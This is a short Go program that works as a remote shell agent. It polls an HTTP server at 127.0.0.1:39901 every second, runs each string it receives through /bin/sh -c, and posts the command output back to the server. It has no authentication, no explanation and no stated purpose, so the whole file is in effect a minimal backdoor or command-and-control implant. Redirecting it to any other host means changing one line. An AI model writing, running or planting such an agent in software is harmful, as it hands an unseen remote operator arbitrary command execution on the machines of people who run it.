package main

import (
	"bytes"
	"fmt"
	"net/http"
	"os/exec"
	"time"
)

func handleError(err error) (b bool) {
	if err != nil {
		fmt.Println(err)
		return true
	}
	return false
}

func handleCommand(str string, server string) {
	switch str {
	case "***NIL***":
		return
	default:
		cmd := exec.Command("/bin/sh", "-c", str)
		out, err := cmd.CombinedOutput()
		buff := bytes.NewBuffer(out)
		if err != nil {
			// TODO: send error in post
		} else {
			// TODO: error handle on down post
			http.Post(server, "text/plain", buff)
		}
		return
	}

}

func main() {
	var buff bytes.Buffer
	server := "http://127.0.0.1:39901/"
	for {
		buff.Reset()
		// TODO: check for server down / refusal
		r, err := http.Get(server)
		if handleError(err) {
			return
		}
		buff.ReadFrom(r.Body)
		fmt.Println(buff.String())

		go handleCommand(buff.String(), server)
		time.Sleep(1 * time.Second)
	}
}
